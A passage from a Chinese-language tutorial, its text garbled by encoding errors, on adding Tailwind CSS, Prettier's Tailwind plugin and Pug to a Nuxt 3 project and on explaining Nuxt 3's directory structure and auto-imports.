Step 3. èª¿æ•´ tailwind.config.js æ‰“é–‹å‰›å‰›ç”¢ç”Ÿçš„è¨­å®šæª” tailwind.config.jsï¼Œåœ¨é…ç½®ä¸­çš„ content é™£åˆ—æ·»åŠ ä¸€äº›è·¯å¾‘ï¼Œé€™äº›è·¯å¾‘çš†æ˜¯è·Ÿ Nuxt æœ‰é—œçš„è³‡æ–™å¤¾ç›®éŒ„èˆ‡æª”æ¡ˆï¼Œå®Œæˆå¾Œæª”æ¡ˆå…§å®¹å¦‚ä¸‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** @type {import(\u0026#39;tailwindcss\u0026#39;).Config} */ module.exports = { content: [ \u0026#39;./components/**/*.{vue,js,ts}\u0026#39;, \u0026#39;./layouts/**/*.vue\u0026#39;, \u0026#39;./pages/**/*.vue\u0026#39;, \u0026#39;./composables/**/*.{js,ts}\u0026#39;, \u0026#39;./plugins/**/*.{js,ts}\u0026#39;, \u0026#39;./app.{js,ts,vue}\u0026#39; ], theme: { extend: {} }, plugins: [] } Step 4. å»ºç«‹ tailwind.css æ¥è‘—æˆ‘å€‘åœ¨å°ˆæ¡ˆå»ºç«‹ç›®éŒ„ assets èˆ‡å­ç›®éŒ„ css ç”¨ä¾†æ”¾ç½® Tailwind CSS çš„è‡ªå®šç¾©æŒ‡ä»¤ï¼Œæˆ‘å€‘å°‡å…¶æ”¾ç½®åœ¨ tailwind.css ä¾›å¾ŒçºŒåšä½¿ç”¨ï¼Œtailwind.css çš„è·¯å¾‘æ‡‰æœƒæ˜¯ ./assets/css/tailwind.css æª”æ¡ˆå…§å®¹å¦‚ä¸‹ã€‚\n1 2 3 @tailwind base; @tailwind components; @tailwind utilities; Step 5. é…ç½®å…¨åŸŸå…±ç”¨ CSS ä¸Šé¢æˆ‘å€‘å»ºç«‹å¥½ tailwind.css å¾Œï¼Œç‚ºäº†è®“æ¯å€‹é é¢éƒ½å¯ä»¥åƒå¾—åˆ° Tailwind CSSï¼Œæˆ‘å€‘ä¿®æ”¹å°ˆæ¡ˆæ ¹ç›®éŒ„çš„ nuxt.config.ts æª”æ¡ˆï¼Œåœ¨ css åƒæ•¸é™£åˆ—å…§æ–°å¢ tailwind.css è·¯å¾‘ï¼Œè®“ Nuxt å¯ä»¥é…ç½®å…¨åŸŸå…±ç”¨çš„ CSSï¼Œä¸¦æ·»åŠ  postcss é¸é …åŠæˆ‘å€‘å‰›æ‰å®‰è£çš„å¥—ä»¶ä½œç‚ºæ’ä»¶ï¼Œæœ€å¾Œ nuxt.config.ts æª”æ¡ˆçœ‹èµ·ä¾†å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // https://v3.nuxtjs.org/api/configuration/nuxt.config export default defineNuxtConfig({ postcss: { plugins: { \u0026#39;postcss-import\u0026#39;: {}, \u0026#39;tailwindcss/nesting\u0026#39;: {}, tailwindcss: {}, autoprefixer: {} } }, css: [\u0026#39;@/assets/css/tailwind.css\u0026#39;], typescript: { typeCheck: true } }) è‡³æ­¤ï¼Œæˆ‘å€‘å°ˆæ¡ˆç›®éŒ„æª”æ¡ˆå¦‚ä¸‹çµæ§‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nuxt-app â”œâ”€â”€ .nuxt/ â”œâ”€â”€ assets/ â”‚ â””â”€â”€ css/ â”‚ â””â”€â”€ tailwind.css // æ‰‹å‹•æ–°å¢çš„æª”æ¡ˆï¼Œç”¨æ–¼è¨­ç½® Tailwind CSS æŒ‡ä»¤ä¸¦è®“å…¨éƒ¨é é¢å¼•ç”¨ â”œâ”€â”€ node_modules/ â”œâ”€â”€ .eslintrc.js â”œâ”€â”€ .gitignore â”œâ”€â”€ .prettierrc.js â”œâ”€â”€ app.vue â”œâ”€â”€ nuxt.config.ts â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â”œâ”€â”€ README.md â”œâ”€â”€ tailwind.config.js // Tailwind åˆå§‹åŒ–æŒ‡ä»¤ç”¢ç”Ÿçš„è¨­å®šæª” â””â”€â”€ tsconfig.json Step 6. é‡å•Ÿ Nuxt æœå‹™ é‡æ–°å•Ÿå‹•æˆ‘å€‘çš„ Nuxt æœå‹™ã€‚\n1 npm run dev -- -o é–‹å§‹æ„Ÿå— Tailwind CSS çš„é­…åŠ› ç•¶æˆ‘å€‘é…ç½®å®Œ Tailwind CSS ä¸¦é‡å•Ÿ Nuxt æœå‹™å¾Œï¼Œæˆ‘å€‘ç·¨è¼¯ app.vue æª”æ¡ˆå…§å®¹ï¼Œæ’°å¯«ä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-blue-600\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-900\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; é‡æ–°ç€è¦½ä¸€æ¬¡ç¶²é ï¼Œå¯ä»¥ç™¼ç¾æ’ç‰ˆã€é¡è‰²ã€å­—å‹éƒ½æœ‰å‡ºç¾æˆ‘å€‘è¨­å®šçš„æ•ˆæœäº†ã€‚\nè‡ªå‹•æ’åº Tailwind CSS çš„ Class ç•¶æˆ‘å€‘åœ¨å¯« Tailwind CSS æ™‚çµ‚ç©¶æœƒç¢°åˆ°é¡å‹éå¤šï¼Œç¬¬ä¸€çœ¼ä¸ç¢ºå®šæ˜¯å¦åŒ…å«æŸå€‹ classï¼Œæˆ–è€…å°æ–¼é †åºä¸Šæœ‰å¼·çƒˆçµ±ä¸€çš„è¦æ±‚ï¼Œé‚£éº¼é€™å€‹ Prettier çš„æ’ä»¶ï¼Œprettier-plugin-tailwindcss æ’ä»¶æ˜¯ Tailwind æ¨å‡ºçš„ï¼Œç›®çš„åœ¨æ–¼å¯ä»¥ä½¿ç”¨å®˜æ–¹æ¨è–¦çš„ class é †åºï¼Œä¾†å¯¦ç¾è‡ªå‹•æ’åº class ä¾†åšåˆ°çµ±ä¸€ç¨‹å¼ç¢¼é¢¨æ ¼ã€‚\nTailwind x Prettier Step 1. å®‰è£æ’ä»¶ 1 2 3 npm install -D prettier-plugin-tailwindcss # or # yarn add -D prettier-plugin-tailwindcss å¦‚æœä½ ä¸æ˜¯ç…§è‘—å‰é¢çš„æ­¥é©Ÿå»ºç½®å°ˆæ¡ˆï¼Œè«‹è¨˜å¾—ç¢ºèªå·²ç¶“æœ‰å®‰è£ prettier å¥—ä»¶ã€‚\nStep 2. é…ç½®è¨­å®šæª” é–‹å•Ÿ .prettierrc.js æª”æ¡ˆï¼Œæ·»åŠ  'prettier-plugin-tailwindcss' è‡³ plugins é™£åˆ—ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 module.exports = { plugins: [ \u0026#39;prettier-plugin-tailwindcss\u0026#39; ], printWidth: 100, // æ¯è¡Œæ–‡å­—æ•¸é‡é” 100 å­—å…ƒå°±æ›åˆ°æ–°çš„ä¸€è¡Œ semi: false, // æ¯å€‹èªå¥çš„çµå°¾ä¸éœ€è¦åˆ†è™Ÿ singleQuote: false, // å­—ä¸²ä½¿ç”¨å–®å¼•è™Ÿï¼Œè€Œä¸æ˜¯é›™å¼•è™Ÿ trailingComma: \u0026#39;none\u0026#39; // å¦‚ Objectã€Array å…§çš„å…ƒç´ ä¸éœ€è¦å°¾éš¨é€—è™Ÿ } Step 3. è‡ªå‹•ä¿®æ­£æ•ˆæœ ä½ å¯ä»¥åœ¨ç·¨è¼¯å™¨å…§ç§»è‡³éŒ¯èª¤æ³¢æµªåº•ç·šä½¿ç”¨ã€Œå¿«é€Ÿä¿®å¾© (Quick Fix)\u0026hellip;ã€åŠŸèƒ½ï¼Œæˆ–è¨­ç½® \u0026quot;editor.codeActionsOnSave\u0026quot; ä¸­ \u0026quot;source.fixAll.eslint\u0026quot;: true ä¾†é”åˆ°ä¿å­˜å¾Œè‡ªå‹•ä¿®æ­£ prettier å¼•ç™¼çš„ ESLint éŒ¯èª¤ã€‚\nå°çµ ç›¸è¼ƒæ–¼ Tailwind CSS å®˜æ–¹æŒ‡å¼•çš„å®‰è£æ–¹å¼ï¼Œä½¿ç”¨ Nuxt Community å¹«æˆ‘å€‘æ•´ç†å¥½çš„ @nuxtjs/tailwindcss æ¨¡çµ„ï¼Œå¯ä»¥çœå»ç¹ç‘£çš„è¨­å®šæ­¥é©Ÿï¼Œä¹Ÿè§£æ±ºäº†ä¸€äº›ç›®å‰ Nuxt 3 å°ˆæ¡ˆä¸­ï¼Œå°å…¥ Tailwind CSS ä½¿ç”¨ HMR å¯èƒ½ç„¡æ³•è‡ªå‹•ç·¨è­¯ä¸¦é‡æ–°å¥—ç”¨ç­‰å•é¡Œã€‚\nä½¿ç”¨ Pug pug ç‚º html æ¨¡æ¿èªè¨€ï¼Œå¯æ”¯æ´æ’°å¯« JS é‚è¼¯ã€‚å¯«æ³•ä¸Šï¼Œçœç•¥äº† HTML çš„é–‹ã€é–‰åˆæ¨™ç±¤ï¼Œèƒ½å¤ å¤§å¤§çš„æå‡å·¥ç¨‹å¸«é–‹ç™¼é€Ÿåº¦ï¼Œçœ‹ä¸Šå»ä¹Ÿæ›´ç‚ºç°¡æ½”ã€‚\nåœ¨æœ¬ç¯‡æ–‡ç« æˆ‘ä¾èˆŠä¸å†å¤šèŠ±ç¯‡å¹…ä»‹ç´¹ pug çš„èªæ³•ï¼Œä¸»è¦é‡å° Nuxt 3 å¦‚ä½•å°å…¥ pug è‡³å°ˆæ¡ˆå…§ä½¿ç”¨ã€‚\nç‚ºäº†ä¹‹å¾Œé–‹ç™¼èƒ½å°‘æ‰“ä¸€é» Codeï¼Œé€™é‚ŠåŠ å…¥ pug åˆ°å°ˆæ¡ˆã€‚\nå®‰è£ @vite-plugin-pug 1 2 3 npm install -D vite-plugin-pug # or # yarn add -D vite-plugin-pug ç›´æ¥é–‹å§‹é«”é©— Pug ç›´æ¥å°‡åŸå…ˆçš„ app.vue æ”¹ç”¨ pug èªæ³•ä¾†æ’°å¯«ï¼š\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template lang=\u0026#34;pug\u0026#34;\u0026gt; div .bg-white.py-24 .flex-col.items-center.flex h1.text-6xl.font-semibold.text-blue-600 2022 iThome p.mt-4.text-9xl.font-bold.text-gray-900 éµäººè³½ \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: string = \u0026#34;2022\u0026#34; \u0026lt;/script\u0026gt; é€™é‚Šæ¨è–¦ä¸€æ¬¾ VS Code çš„å¥—ä»¶ - html2pugï¼Œå°‡ HTML åç™½å¾Œé»é¸ VS Code ä¸Šæ–¹çš„ View \u0026gt; Command Palette\u0026hellip;ï¼Œå°‹æ‰¾ä¸¦åŸ·è¡Œ \u0026quot;\u0026gt; html2pug: Transform\u0026quot;ï¼Œå³å¯å°‡åç™½çš„ HTML è‡ªå‹•è½‰æ›æˆ pug èªæ³•ã€‚\nä¸ç”¨ç®¡ HTML çš„çµå°¾ç¬¦è™Ÿï¼Œå¯«èµ·ä¾†æ•´å€‹å°±æ˜¯èˆ’æœé˜¿~~~\nç›®éŒ„çµæ§‹èˆ‡è‡ªå‹•è¼‰å…¥ (Auto Imports) éš¨è‘—æ•´å€‹å°ˆæ¡ˆçš„é–‹ç™¼ï¼Œç›®éŒ„èˆ‡å…ƒä»¶å‹¢å¿…ä¹Ÿæœƒè¶Šä¾†è¶Šå¤šï¼Œå¦‚åŒ Vue 3 çš„å°ˆæ¡ˆå¯èƒ½æœƒæœ‰å°ˆé–€æ”¾ç½®å…ƒä»¶ç›®éŒ„ components ç­‰ï¼Œåœ¨ Vue 3 æˆ‘å€‘å¯èƒ½ä¸å¤ªéœ€è¦å»åœ¨æ„ç›®éŒ„çš„åç¨±ï¼Œä½†åœ¨ Nuxt 3 çš„å°ˆæ¡ˆä¸‹ï¼Œæœ‰ä¸€äº›ç›®éŒ„èˆ‡åç¨±å…¶å¯¦æœ‰ä¸€äº›åŸºæœ¬çš„è¦å®šèˆ‡åç¨±ï¼Œåªè¦ç…§è‘— Nuxt 3 ç´„å®šå¥½çš„æ–¹å¼é€²è¡Œé–‹ç™¼ï¼Œå°±èƒ½æ›´å¥½åˆ©ç”¨ Nuxt 3 å¹«ä½ å®Œæˆè¨±å¤šè²¼å¿ƒçš„åŠŸèƒ½ã€‚\nNuxt 3 çš„ç›®éŒ„çµæ§‹ ç•¶æˆ‘å€‘ Nuxt CLI å»ºç«‹ç¬¬ä¸€å€‹ Nuxt 3 å°ˆæ¡ˆä¸¦ç¬¬ä¸€æ¬¡å•Ÿå‹•é–‹ç™¼ä¼ºæœå™¨å¾Œï¼Œå°ˆæ¡ˆç›®éŒ„çµæ§‹æœƒé•·å¾—åƒé€™æ¨£ï¼š\nå¦‚æœä½ æ˜¯è·Ÿè‘—é€™å€‹ç³»åˆ—å®‰è£äº† TypeScriptã€Linterã€Tailwind CSS åŠ Pug ç­‰å¥—ä»¶ï¼Œé‚£éº¼å°ˆæ¡ˆç›®éŒ„çµæ§‹æœƒé•·å¾—åƒé€™æ¨£ï¼š\né›–ç„¶æˆ‘å€‘èƒ½ä¾ç…§éœ€æ±‚å»ºç«‹æª”æ¡ˆåŠç›®éŒ„ï¼Œä½† Nuxt 3 åœ¨ç›®éŒ„çš„çµæ§‹èˆ‡å‘½åå…¶å¯¦æœ‰ä¸€å®šçš„è¦å‰‡èˆ‡æ¨¡å¼ï¼Œä»¥ä¸‹é‡å° Nuxt 3 ä¾†è¬›è¿°ä¸€ä¸‹ç›®éŒ„çš„çµæ§‹èˆ‡éµå¾ªçš„æ–¹å¼ã€‚\nNuxt 3 é è¨­çš„ç›®éŒ„çµæ§‹ Nuxt 3 æ¡†æ¶å¸Œæœ›æˆ‘å€‘å¯ä»¥å°ˆæ³¨åœ¨é–‹ç™¼è€Œä¸æ˜¯åœ¨é…ç½®ï¼Œæ‰€ä»¥åœ¨é è¨­çš„æƒ…æ³å°ˆæ¡ˆçš„ç›®éŒ„æ¶æ§‹å·²ç¶“æœ‰ä¸€å€‹ä¸éŒ¯çš„çµæ§‹å¯ä»¥éµå¾ªã€‚\nä¾æ“šå®˜æ–¹æ–‡ä»¶ï¼Œä¸€å€‹å®Œæ•´çš„ Nuxt 3 å°ˆæ¡ˆï¼Œå®ƒçš„ç›®éŒ„çµæ§‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 nuxt-app/ â”œâ”€â”€ .nuxt/ â”œâ”€â”€ .output/ â”œâ”€â”€ assets/ â”œâ”€â”€ components/ â”œâ”€â”€ composables/ â”œâ”€â”€ content/ â”œâ”€â”€ layouts/ â”œâ”€â”€ middleware/ â”œâ”€â”€ node_modules/ â”œâ”€â”€ pages/ â”œâ”€â”€ plugins/ â”œâ”€â”€ public/ â””â”€â”€ server/ â”œâ”€â”€ api/ â”œâ”€â”€ routes/ â””â”€â”€ middleware/ â”œâ”€â”€ .gitignore â”œâ”€â”€ .nuxtignore â”œâ”€â”€ app.config.ts â”œâ”€â”€ app.vue â”œâ”€â”€ nuxt.config.ts â”œâ”€â”€ package.json â””â”€â”€ tsconfig.json .nuxt ç›®éŒ„ é–‹ç™¼ç’°å¢ƒä¸‹ç”± Nuxt ç”¢ç”Ÿå‡º Vue çš„ç¶²ç«™ï¼Œ.nuxt ç›®éŒ„æ˜¯è‡ªå‹•ç”¢ç”Ÿçš„ï¼Œä½ ä¸æ‡‰è©²ä»»æ„çš„èª¿æ•´è£¡é¢æª”æ¡ˆã€‚\n.output ç›®éŒ„ ç•¶ä½ çš„ç¶²ç«™æº–å‚™éƒ¨ç½²è‡³æ­£å¼ç’°å¢ƒæ™‚ï¼Œæ¯æ¬¡ç·¨è­¯å»ºæ§‹å°ˆæ¡ˆæ™‚ï¼Œçš†æœƒè‡ªå‹•é‡æ–°ç”¢ç”Ÿé€™å€‹ç›®éŒ„ï¼Œä½ ä¸æ‡‰è©²ä»»æ„çš„èª¿æ•´è£¡é¢æª”æ¡ˆã€‚\nassets ç›®éŒ„ é¡§åæ€ç¾©ï¼Œé€™æ˜¯éœæ…‹è³‡æºæª”æ¡ˆæ‰€æ”¾ç½®çš„ä½ç½®ï¼Œç›®éŒ„å…§é€šå¸¸åŒ…å«ä»¥ä¸‹é¡å‹çš„æª”æ¡ˆï¼š\nCSS æ¨£å¼æª”æ¡ˆ (CSSã€SASS ç­‰\u0026hellip;) å­—å‹ åœ–ç‰‡ é€™äº›éœæ…‹è³‡æºï¼Œæœ€çµ‚åœ¨å°ˆæ¡ˆç·¨è­¯å»ºæ§‹æ™‚ï¼Œç”± Vite æˆ– webpack é€²è¡Œç·¨è­¯æ‰“åŒ…ã€‚\ncomponents ç›®éŒ„ æ”¾ç½® Vue å…ƒä»¶çš„åœ°æ–¹ï¼ŒNuxt æœƒè‡ªå‹•è¼‰å…¥é€™å€‹ç›®éŒ„ä¸­çš„ä»»ä½•å…ƒä»¶ã€‚\ncomposables ç›®éŒ„ çµ„åˆå¼å‡½æ•¸æ”¾ç½®çš„ç›®éŒ„ï¼Œç°¡å–®ä¾†èªªå¯ä»¥æŠŠå¸¸ç”¨æˆ–é€šç”¨çš„åŠŸèƒ½å¯«æˆä¸€å€‹å…±ç”¨çš„å‡½æ•¸æˆ– JS æª”æ¡ˆï¼Œæ”¾ç½®åœ¨é€™å€‹ç›®éŒ„è¦–ç‚ºçµ„åˆå¼å‡½æ•¸ï¼ŒNuxt ä¹Ÿæœƒè‡ªå‹•è¼‰å…¥é€™äº›çµ„åˆå¼å‡½æ•¸ï¼Œè®“éœ€è¦ä½¿ç”¨çš„é é¢æˆ–å…ƒä»¶å¯ä»¥ç›´æ¥åšä½¿ç”¨ã€‚\ncontent ç›®éŒ„ é€éä½¿ç”¨ Nuxt Contentï¼Œæˆ‘å€‘å¯ä»¥åœ¨é€™å€‹ç›®éŒ„ä¸‹å»ºç«‹ .mdã€.ymlã€.csv å’Œ .json æª”æ¡ˆï¼ŒNuxt Content æœƒè®€å–ä¸¦è§£æé€™äº›æ–‡ä»¶ä¸¦é€²è¡Œæ¸²æŸ“ï¼Œç”¨ä¾†å»ºç«‹åŸºæ–¼æ–‡ä»¶çš„å…§å®¹ç®¡ç†ç³»çµ±(Content Management Systemï¼Œç°¡ç¨±ï¼šCMS)ã€‚\nlayouts ç›®éŒ„ ç”¨æ–¼æ”¾ç½®é€šç”¨æˆ–å¯èƒ½é‡è¤‡ä½¿ç”¨åˆ°çš„ä½ˆå±€æ¨¡æ¿ï¼Œæä¾›ç¨‹å¼ç¢¼çš„å¯é‡è¤‡ä½¿ç”¨æ€§ã€‚\nmiddleware ç›®éŒ„ Nuxt 3 æä¾›äº†è·¯ç”±ä¸­é–“ä»¶çš„æ¦‚å¿µï¼Œç”¨æ–¼å°èˆªåˆ°ä¸‹ä¸€å€‹é é¢ä¹‹å‰åŸ·è¡Œä¸€äº›ç¨‹å¼ç¢¼å¦‚æ¬Šé™é©—è­‰\u0026hellip;ç­‰ã€‚\nnode_modules ç›®éŒ„ é€šå¸¸æœ‰ä½¿ç”¨ Node.js çš„å¥—ä»¶ç®¡ç†ï¼Œä¾‹å¦‚ NPMï¼Œå°æ­¤ç›®éŒ„æ‡‰è©²æœ‰ä¸€äº›å°è±¡ï¼Œä½¿ç”¨ Nuxt 3 åŠå°ˆæ¡ˆæ‰€éœ€è¦çš„ç›¸ä¾å¥—ä»¶éƒ½æœƒå­˜æ”¾åœ¨é€™å€‹ç›®éŒ„ã€‚\npages ç›®éŒ„ é€™å€‹ç›®éŒ„ä¸»è¦æ˜¯ç”¨ä¾†é…ç½®æˆ‘å€‘çš„é é¢ï¼Œä½ ä¹Ÿå¯ä»¥åªä½¿ç”¨ app.vue ä¾†å®Œæˆä½ çš„ç¶²ç«™ï¼Œä½†å¦‚æœå»ºç«‹äº† pages é€™å€‹ç›®éŒ„ï¼ŒNuxt 3 æœƒè‡ªå‹•æ•´åˆ vue-routerï¼Œä¸¦æœƒä¾æ“šç›®éŒ„åŠæª”æ¡ˆçµæ§‹è¦å‰‡ä¾†è‡ªå‹•ç”¢ç”Ÿå‡ºå°æ‡‰è·¯ç”±ï¼Œä¹Ÿæ˜¯ Nuxt3 ç”¢ç”Ÿè·¯ç”±çš„æ–¹å¼ã€‚\nplugins ç›®éŒ„ Nuxt æœƒè‡ªå‹•è¼‰å…¥é€™å€‹ç›®éŒ„æª”æ¡ˆï¼Œä½œç‚ºæ’ä»¶ä½¿ç”¨ï¼Œåœ¨æª”æ¡ˆåç¨±å¯ä»¥ä½¿ç”¨å¾Œç¶´ .server æˆ– .clientï¼Œä¾‹å¦‚ï¼Œplugin.server.ts æˆ– plugin.client.ts ä¾†æ±ºå®šåªè®“ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯è¼‰å…¥é€™å€‹æ’ä»¶ã€‚\nserver ç›®éŒ„ ç”¨æ–¼å»ºç«‹ä»»ä½•å¾Œç«¯çš„é‚è¼¯å¦‚å¾Œç«¯ APIï¼Œé€™å€‹ç›®éŒ„ä¸‹é‚„åŒ…å«äº† apiã€server å’Œ middleware ä¾†å€åˆ†åŠŸèƒ½ï¼Œä¸å…·æœ‰è‡ªå‹•è¼‰å…¥ï¼Œä½†æ”¯æ´ HMRã€‚\n.gitignore æª”æ¡ˆ åœ¨ä½¿ç”¨ Git ç‰ˆæœ¬æ§åˆ¶æ™‚ï¼Œå¯ä»¥è¨­ç½®ä¸€äº›ä¸éœ€è¦æˆ–å¿½ç•¥é—œæ³¨è®Šå‹•çš„æª”æ¡ˆåŠç›®éŒ„ã€‚\n.nuxtignore æª”æ¡ˆ å¯ä»¥è¨­ç½®è®“ Nuxt ç·¨è­¯å»ºæ§‹æ™‚ï¼Œå¿½ç•¥ä¸€äº›ä¸éœ€è¦æˆ–æ¬²å¿½ç•¥çš„æª”æ¡ˆã€‚\napp.config.ts æª”æ¡ˆ æä¾›æœå‹™é‹è¡Œæ™‚æš´éœ²çµ¦å®¢æˆ¶ç«¯ä½¿ç”¨çš„è¨­å®šï¼Œå› æ­¤ï¼Œè«‹ä¸è¦åœ¨ app.config.ts æª”æ¡ˆä¸­æ·»åŠ ä»»ä½•æ©Ÿå¯†è³‡è¨Šã€‚\napp.vue æª”æ¡ˆ Nuxt 3 ç¶²ç«™çš„å…¥å£é»å…ƒä»¶ã€‚\nnuxt.config.ts æª”æ¡ˆ ç”¨æ–¼é…ç½® Nuxt å°ˆæ¡ˆçš„è¨­å®šæª”ã€‚\npackage.json æª”æ¡ˆ é€™å€‹æª”æ¡ˆè£¡é¢å®šç¾©äº†å°ˆæ¡ˆè³‡è¨Šã€è…³æœ¬ã€ç›¸ä¾å¥—ä»¶åŠç‰ˆæœ¬è™Ÿï¼Œé€šå¸¸æœ‰ä½¿ç”¨ Node.js å¥—ä»¶ç®¡ç†å·¥å…·å»ºç½®çš„å°ˆæ¡ˆéƒ½æœƒåŒ…å«æ­¤æª”æ¡ˆã€‚\ntsconfig.json æª”æ¡ˆ Nuxt 3 æœƒåœ¨ .nuxt ç›®éŒ„ä¸‹è‡ªå‹•ç”¢ç”Ÿä¸€å€‹ tsconfig.json æª”æ¡ˆï¼Œå…¶ä¸­å·²ç¶“åŒ…å«äº†ä¸€äº›è§£æåˆ¥åç­‰é è¨­é…ç½®ï¼›ä½ å¯ä»¥é€éå°ˆæ¡ˆç›®éŒ„ä¸‹çš„ tsconfig.json ä¾†é…ç½®æ“´å±•æˆ–è¦†è“‹ Nuxt 3 é è¨­çš„ TypeScript è¨­å®šæª”ã€‚\nè‡ªè¨‚ç›®éŒ„åç¨± å‰é¢ç°¡ä»‹äº† Nuxt 3 çš„é è¨­ç›®éŒ„çµæ§‹èˆ‡ç”¨é€”ï¼Œåœ¨ç›®éŒ„åç¨±ä¸Š Nuxt 3 ä¹Ÿæä¾›äº†å¯ä»¥èª¿æ•´ç›®éŒ„åç¨±çš„æ–¹å¼ï¼Œåªè¦åœ¨ nuxt.config.ts ä¿®æ”¹å°æ‡‰çš„åƒæ•¸ï¼Œå°±å¯ä»¥è‡ªè¨‚ç›®éŒ„çš„åç¨±ã€‚ä¸éå‘¢ï¼Œä¹Ÿä¸¦ä¸æ˜¯æ‰€æœ‰çš„ç›®éŒ„éƒ½èƒ½ä¿®æ”¹ï¼Œç›®å‰å®˜æ–¹æä¾›çš„ dir åƒæ•¸å…±æœ‰ä»¥ä¸‹å››å€‹ç›®éŒ„åƒæ•¸é¸é …ä¾›ä¿®æ”¹ï¼š\nlayouts middleware pages public ä¾‹å¦‚æˆ‘æƒ³å°‡ pages ç›®éŒ„åç¨±èª¿æ•´ç‚º views å°±å¯ä»¥æ–°å¢ä¸‹åˆ— dir è¨­å®šæ·»åŠ è‡³ nuxt.config.tsï¼Œå°±å¯ä»¥å°‡ pages ç›®éŒ„åŠŸèƒ½åŠè¦å‰‡èª¿æ•´ç‚º views ç›®éŒ„ä¾†å¯¦ç¾ã€‚\n1 2 3 4 5 export default defineNuxtConfig({ dir: { pages: \u0026#39;views\u0026#39;, } } è‡ªå‹•è¼‰å…¥ (Auto Imports) åœ¨ä»‹ç´¹ç›®éŒ„çµæ§‹æ™‚æœ‰æåˆ°ï¼ŒæŸäº›ç›®éŒ„ä¸‹çš„æª”æ¡ˆæ˜¯å…·æœ‰è‡ªå‹•è¼‰å…¥ (Auto Imports)çš„åŠŸèƒ½ï¼Œæ„æ€å°±æ˜¯èªªï¼Œç•¶æˆ‘å€‘åœ¨é€™äº›ç‰¹å®šçš„ç›®éŒ„ componentsã€composablesã€layoutsã€plugins æ·»åŠ æª”æ¡ˆæ™‚ï¼ŒNuxt 3 æœƒè‡ªå‹•è¼‰å…¥é€™äº›å…ƒä»¶æˆ–å‡½æ•¸ã€‚\nNuxt 3 çš„è‡ªå‹•è¼‰å…¥å…·é«”æœ‰ä»¥ä¸‹ä¸‰ç¨®ï¼š\nNuxt å¸¸ç”¨å…ƒä»¶èˆ‡å‡½æ•¸ Vue 3 çš„ API åŸºæ–¼ç›®éŒ„çš„è‡ªå‹•è¼‰å…¥ Nuxt å¸¸ç”¨å…ƒä»¶èˆ‡å‡½æ•¸çš„è‡ªå‹•è¼‰å…¥ Nuxt æœƒè‡ªå‹•è¼‰å…¥ä¸€äº›å…ƒä»¶æˆ–çµ„åˆå¼å‡½æ•¸ï¼Œç”¨ä»¥è®“é–‹ç™¼æ™‚å¯ä»¥åœ¨å…¨éƒ¨é é¢æˆ–å®šç¾©çµ„ä»¶å’Œæ’ä»¶å¯ä»¥ä½¿ç”¨ã€‚\nNuxt è‡ªå‹•è¼‰å…¥çš„å…ƒä»¶å°±å¥½æ¯” app.vue ç¨‹å¼ç¢¼å…§ï¼Œä¸€é–‹å§‹åœ¨ template å°±æœ‰çš„ \u0026lt;NuxtWelcome /\u0026gt; æ­¡è¿é é¢å…ƒä»¶ï¼Œå…¶ä»–é‚„åŒ…å«äº† \u0026lt;NuxtPage\u0026gt;ã€\u0026lt;NuxtLayout\u0026gt; å’Œ \u0026lt;NuxtLink\u0026gt; ç­‰ï¼Œè©³ç´°å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ã€‚\nä¾‹å¦‚ï¼Œä¸‹é¢ç¨‹å¼ç¢¼ä¸­çš„ useAsyncData èˆ‡ $fetch å°±æ˜¯ Nuxt è‡ªå‹•è¼‰å…¥çš„çµ„åˆå¼å‡½æ•¸ï¼Œåœ¨å„å€‹é é¢æˆ–å…ƒä»¶éƒ½èƒ½åšä½¿ç”¨ã€‚\n1 2 3 \u0026lt;script setup\u0026gt; const { data, refresh, pending } = await useAsyncData(\u0026#39;/api/hello\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/hello\u0026#39;)) \u0026lt;/script\u0026gt; Vue 3 API çš„è‡ªå‹•è¼‰å…¥ ä¾‹å¦‚ï¼ŒVue 3 ä¸­æœƒä½¿ç”¨åˆ°çš„ refã€computed ç­‰é€™é¡çš„ helpers æˆ– lifecycle hooksï¼Œåœ¨ Nuxt 3 ä¹Ÿéƒ½å°‡æœƒè‡ªå‹•çš„è¼‰å…¥ï¼Œä¸éœ€è¦åœ¨ importã€‚\n1 2 3 4 5 \u0026lt;script setup\u0026gt; // ä¸éœ€è¦åœ¨ import ref æˆ– computed const count = ref(1) const double = computed(() =\u0026gt; count.value * 2) \u0026lt;/script\u0026gt; åŸºæ–¼ç›®éŒ„çš„è‡ªå‹•è¼‰å…¥ å¦‚å‰é¢æ‰€æåŠçš„ï¼ŒNuxt æœƒè‡ªå‹•è¼‰å…¥å®šç¾©åœ¨ç‰¹å®šç›®éŒ„çš„æª”æ¡ˆï¼Œä¾‹å¦‚ï¼š\ncomponents: ç›¸å°æ–¼ Vue çš„çµ„ä»¶ã€‚ composables: ç›¸å°æ–¼ Vue çš„çµ„åˆå¼å‡½æ•¸ã€‚ å»ºç«‹ä¸€å€‹è‡ªå‹•å°å…¥çš„å…ƒä»¶ æˆ‘å€‘å»ºç«‹ä¸€å€‹ ./components/IronManWelcome.vue æª”æ¡ˆï¼š\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col 